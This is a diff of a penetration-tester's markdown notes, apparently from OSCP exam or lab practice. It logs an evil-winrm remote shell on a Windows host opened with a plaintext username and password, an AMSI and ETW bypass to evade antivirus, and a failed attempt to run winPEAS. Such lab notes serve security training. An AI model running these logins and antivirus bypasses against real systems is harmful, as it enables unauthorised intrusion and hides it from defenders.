@@ -44,4 +44,52 @@ get file from vm
 
 ![[{FB3A9F44-C6B9-48A8-A07B-9CE5747D6B48}.png]]
 
-can do anything as user got no permission, script is disabled for this system, maybe winpeas might work=
+can do anything as user got no permission, script is disabled for this system, maybe winpeas might work
+
+```
+
+┌──(kali㉿kali)-[~/OSCP/Exam/AD/192.168.114.206]
+└─$ evil-winrm -u 'r.andrews' -p 'BusyOfficeWorker890' -i 192.168.114.206 -e /home/kali/OSCP/Exam/AD/192.168.114.206  
+Evil-WinRM shell v3.7
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> Bypass-4MSI  
+Warning: AV could be still watching for suspicious activity. Waiting for patching...  
+Info: Patching 4MSI, please be patient...
+[+] Success!   
+Info: Patching ETW, please be patient ..    
+[+] Success!
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> menu 
+Info: Bypass-4MSI is loaded. Trying to load utilities
+
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> Invoke-Binary /home/kali/OSCP/Exam/AD/192.168.114.206/winPEASx64.exe    
+Error: Check filenames
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> 
+
+```
+
+cant run exe file 
